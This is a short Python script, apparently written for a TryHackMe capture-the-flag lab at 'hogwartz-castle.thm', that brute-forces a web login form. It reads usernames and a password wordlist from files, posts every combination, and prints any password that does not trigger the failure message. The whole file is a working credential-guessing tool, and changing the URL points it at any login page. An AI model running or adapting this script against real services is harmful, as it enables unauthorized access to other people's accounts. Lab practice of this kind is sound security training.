#!/usr/bin/env python3

import requests

url = "http://hogwartz-castle.thm/login"
uname = "user"
passw = "password"
pwd_file = "samba/spellnames.txt" # change this to hold your password file.
usr_file = "users.txt"
fail = "Incorrect Username or Password"


def gen_pwd(filename):
    with open(filename,'r') as fptr:
        for pwd in fptr:
            yield pwd.strip('\n')
    return

def gen_usr(filename):
    with open(filename,'r') as fptr:
        for usr in fptr:
            yield usr.strip('\n')
    return

a = gen_usr(usr_file)

for user in a:
    print("{0:*^60}".format(" {0} ".format(user)))
    r_dict = { uname : user, passw : None }
    x = gen_pwd(pwd_file)
    for password in x:
        r_dict[passw] = password

        resp = requests.post(url, data=r_dict)
        
        if fail in resp.text:
            print("Incorrect password: {0}".format(password))
        else:
            print("Password Found: {0}".format(password))
            break

